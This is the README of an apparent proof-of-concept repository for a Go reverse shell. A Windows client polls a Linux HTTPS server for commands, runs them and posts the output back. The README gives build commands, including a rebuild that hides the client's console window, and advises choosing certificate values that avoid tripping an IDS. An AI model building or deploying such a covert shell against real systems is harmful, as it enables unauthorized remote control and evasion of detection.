# Golang HTTPS/TLS Reverse Shell

This is a proof of concept Windows reverse shell written in Golang that uses HTTPS/TLS for communication. The Linux server uses a self-signed certificate and hosts a single static file that contains a Windows command. The Windows client is a x64 PE executable that does a GET request every 30 seconds to obtain a Windows command from the server which then is executed and the results are sent via POST. A traffic file is included with this repository to show an example of the encrypted reverse shell communication.

**Disclaimer: This reverse shell is for research purposes only, and should only be used on authorized systems. Accessing a computer system or network without authorization or explicit permission is illegal.**

## Server (Linux)

It's recommended not to use default values when creating a self-signed certificate as this could generate a certificate that will alert an IDS. Also, note that as the client/server is running you may modify `static/command.html` to your liking.

```shell
$ # create a new directory for your server
$ mkdir server && cd $_
$ # generate a 2048-bit private key and a self-signed certificate
$ openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
$ # create the static directory
$ mkdir static
$ # write a windows command to command.html for the client to GET
$ echo "dir" > static/command.html
$ # build the server
$ go build server.go
$ # start the server
$ sudo ./server
```


## Client (Windows)

You will need to modify the IP address in `client.go` to fit your needs. It's required to first build the client normally, and then build it with the switch options to hide the command prompt window. Double clicking the binary will start the client, given there is a properly configured server. The client has only been tested to work on Windows 7.

```batch
C:\> :: build the client
C:\> go build client.go
C:\> :: rebuild the client so the command prompt is hidden
C:\> go build -ldflags -H=windowsgui client.go
C:\> :: start the client
C:\> client.exe
```
